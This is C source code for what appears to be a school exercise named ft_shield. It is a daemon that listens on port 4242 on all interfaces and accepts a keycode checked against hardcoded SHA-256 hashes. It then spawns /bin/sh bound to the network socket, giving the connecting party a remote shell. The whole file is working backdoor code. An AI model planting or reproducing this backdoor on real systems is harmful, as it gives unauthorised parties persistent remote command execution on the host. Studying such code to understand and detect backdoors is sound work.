#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/stat.h>
#include <errno.h>
#include <openssl/sha.h>

#define PORT 4242
#define MAX_CLIENTS 3
#define BUFFER_SIZE 1024
#define LOCKFILE "/var/run/ft_shield.lock"

// SHA256 hashes of passwords
#define PASSWORD_HASH "73475cb40a568e8da8a045ced110137e159f890ac4da883b6b17dc651b3a8049"
#define ALT_PASSWORD_HASH "0315b4020af3eccab7706679580ac87a710d82970733b8719e70af9b57e7b9e6"

// Global variable to track active clients
static int active_clients = 0;

char* hash_password(const char* input) {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256((unsigned char*)input, strlen(input), hash);

    char* output = malloc(65);
    if (!output) return NULL;

    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        sprintf(output + (i * 2), "%02x", hash[i]);
    }

    output[64] = '\0';
    return output;
}

int create_lockfile() {
    int fd = open(LOCKFILE, O_CREAT | O_EXCL | O_WRONLY, 0644);
    if (fd < 0) {
        if (errno == EEXIST) {
            return 0; // Already running
        }
        return -1;
    }
    close(fd);
    return 1;
}

void cleanup_lockfile() {
    unlink(LOCKFILE);
}

void handle_sigchld(int sig) {
    (void)sig;
    // Clean up zombie processes and decrement counter
    while (waitpid(-1, NULL, WNOHANG) > 0) {
        active_clients--;
    }
}

void handle_sigterm(int sig) {
    (void)sig;
    cleanup_lockfile();
    exit(0);
}

int authenticate_client(int client_fd) {
    char buffer[BUFFER_SIZE];
    char *keycode_prompt = "Keycode: ";
    
    send(client_fd, keycode_prompt, strlen(keycode_prompt), 0);
    
    ssize_t bytes = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);
    if (bytes <= 0) return 0;
    
    buffer[bytes] = '\0';
    
    // Remove newline
    char *newline = strchr(buffer, '\n');
    if (newline) *newline = '\0';
    
    // Hash the input password and compare
    char* input_hash = hash_password(buffer);
    if (input_hash == NULL) {
        return 0;
    }
    
    int auth_success = (strcmp(input_hash, PASSWORD_HASH) == 0 || 
                       strcmp(input_hash, ALT_PASSWORD_HASH) == 0);
    free(input_hash);
    
    if (!auth_success) {
        char *error_msg = "Access denied\n";
        send(client_fd, error_msg, strlen(error_msg), 0);
    }
    
    return auth_success;
}

void handle_client_shell(int client_fd) {
    char *shell_msg = "Spawning shell on port 4242\n";
    send(client_fd, shell_msg, strlen(shell_msg), 0);
    
    // Create shell process
    pid_t pid = fork();
    if (pid == 0) {
        // Child process - exec shell
        dup2(client_fd, STDIN_FILENO);
        dup2(client_fd, STDOUT_FILENO);
        dup2(client_fd, STDERR_FILENO);
        
        execl("/bin/sh", "/bin/sh", NULL);
        exit(1);
    } else if (pid > 0) {
        // Parent - wait for shell to finish
        int status;
        waitpid(pid, &status, 0);
    }
}

void handle_client_commands(int client_fd) {
    char buffer[BUFFER_SIZE];
    char *prompt = "$> ";
    
    while (1) {
        send(client_fd, prompt, strlen(prompt), 0);
        
        ssize_t bytes = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);
        if (bytes <= 0) break;
        
        buffer[bytes] = '\0';
        
        // Remove newline
        char *newline = strchr(buffer, '\n');
        if (newline) *newline = '\0';
        
        if (strcmp(buffer, "shell") == 0) {
            handle_client_shell(client_fd);
            break;
        } else if (strcmp(buffer, "?") == 0) {
            char *help = "? show help\nshell Spawn remote shell on 4242\n";
            send(client_fd, help, strlen(help), 0);
        } else if (strlen(buffer) == 0) {
            continue;
        } else {
            char *unknown = "Unknown command\n";
            send(client_fd, unknown, strlen(unknown), 0);
        }
    }
}

void handle_client(int client_fd) {
    if (authenticate_client(client_fd)) {
        handle_client_commands(client_fd);
    }
    close(client_fd);
}

int main() {
    // Check if already running
    if (create_lockfile() == 0) {
        exit(0); // Already running
    }
    
    signal(SIGTERM, handle_sigterm);
    signal(SIGINT, handle_sigterm);
    signal(SIGCHLD, handle_sigchld); // Handle child process termination
    
    int server_fd, client_fd;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    
    // Create socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        cleanup_lockfile();
        exit(EXIT_FAILURE);
    }
    
    // Set socket options
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    // Configure address
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);
    
    // Bind socket
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        cleanup_lockfile();
        exit(EXIT_FAILURE);
    }
    
    // Listen for connections
    if (listen(server_fd, MAX_CLIENTS) < 0) {
        cleanup_lockfile();
        exit(EXIT_FAILURE);
    }
    
    // Accept connections
    while (1) {
        if ((client_fd = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
            continue;
        }
        
        // Check if we've reached the maximum number of clients
        if (active_clients >= MAX_CLIENTS) {
            char *max_clients_msg = "Maximum number of clients reached\n";
            send(client_fd, max_clients_msg, strlen(max_clients_msg), 0);
            close(client_fd);
            continue;
        }

        active_clients++;
        // Fork to handle client
        pid_t client_pid = fork();
        if (client_pid == 0) {
            close(server_fd);
            handle_client(client_fd);
            exit(0);
        } else if (client_pid > 0) {
            close(client_fd);
        } else {
            // Fork failed, decrement counter
            active_clients--;
        }
    }
    
    cleanup_lockfile();
    return EXIT_SUCCESS;
}